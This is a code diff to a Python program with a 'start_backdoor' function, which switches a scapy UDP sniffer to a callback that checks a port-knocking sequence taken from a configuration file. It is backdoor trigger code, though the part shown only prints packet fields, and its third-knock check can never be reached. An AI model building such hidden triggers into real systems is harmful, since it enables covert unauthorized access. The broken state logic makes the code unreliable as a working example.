@@ -32,6 +32,15 @@ LOG_PATH = "log.txt"
 CONFIGURATION_PATH = "configuration.txt"
 # host_address = ""
 
+receiver_addr = ''
+port1 = 0
+port2 = 0
+port3 = 0
+sender_addr = ''
+sender_port = 0
+port_knock_auth = ''
+knock_order = 0
+
 
 def read_configuration():
     """
@@ -150,6 +159,15 @@ def start_backdoor():
 
     # Read Configuration
     config = read_configuration()
+
+    global receiver_addr
+    global port1
+    global port2
+    global port3
+    global sender_addr
+    global sender_port
+    global port_knock_auth
+
     receiver_addr = config['receiver_address']
     port1 = config['receiver_port1']
     port2 = config['receiver_port2']
@@ -159,48 +177,46 @@ def start_backdoor():
     port_knock_auth = config['port_knock_auth']
 
     # Start sniffing.
-    sniff_port_knock(receiver_addr, port1, port2, port3, sender_addr, sender_port, port_knock_auth)
+    sniff(prn=sniff_process_pkt, filter="udp", store=0)
+    # sniff_port_knock(receiver_addr, port1, port2, port3, sender_addr, sender_port, port_knock_auth)
 
 
-def sniff_port_knock(receiver_addr, port1, port2, port3, sender_addr, sender_port, port_knock_auth):
+def sniff_process_pkt(pkt):
+    global knock_order
 
-    knock_order = 0
+    ip_dst = pkt.payload.dst
+    print(f"IP Dest: {ip_dst}")
 
-    for pkt in sniff(filter=f"udp"):
-        ip_dst = pkt.payload.dst
-        print(f"IP Dest: {ip_dst}")
+    dst_port = pkt.payload.payload.dport
+    print(f"Dst Port: {dst_port}")
 
-        dst_port = pkt.payload.payload.dport
-        print(f"Dst Port: {dst_port}")
+    data = pkt.payload.payload.payload
+    print(f"Payload: {data}")
 
-        data = pkt.payload.payload.payload
-        print(f"Payload: {data}")
-
-        if knock_order == 0:
-            if ip_dst == receiver_addr and dst_port == port1 and data == port_knock_auth:
-                print(f"First knock valid")
-                knock_order = 1
-            else:
-                print(f"First Knock Failed.")
-                continue
-        elif knock_order == 1:
-            if ip_dst == receiver_addr and dst_port == port2 and data == port_knock_auth:
-                print(f"Second knock valid")
-                knock_order = 2
-            else:
-                print(f"Second Knock Failed.")
-                knock_order = 0
-                continue
-        elif knock_order == 3:
-            if ip_dst == receiver_addr and dst_port == port2 and data == port_knock_auth:
-                print(f"Third knock valid")
-                print(f"Data: {data}")
-            else:
-                print(f"Third Knock Failed.")
+    if knock_order == 0:
+        if ip_dst == receiver_addr and dst_port == port1 and data == port_knock_auth:
+            print(f"First knock valid")
+            knock_order = 1
+        else:
+            print(f"First Knock Failed.")
+    elif knock_order == 1:
+        if ip_dst == receiver_addr and dst_port == port2 and data == port_knock_auth:
+            print(f"Second knock valid")
+            knock_order = 2
+        else:
+            print(f"Second Knock Failed.")
+            knock_order = 0
+    elif knock_order == 3:
+        if ip_dst == receiver_addr and dst_port == port2 and data == port_knock_auth:
+            print(f"Third knock valid")
+            print(f"Data: {data}")
+            knock_order = 0
+        else:
+            print(f"Third Knock Failed.")
             knock_order = 0
 
 
-        # if len(data)
+    # if len(data)
 
 
     # data = ""
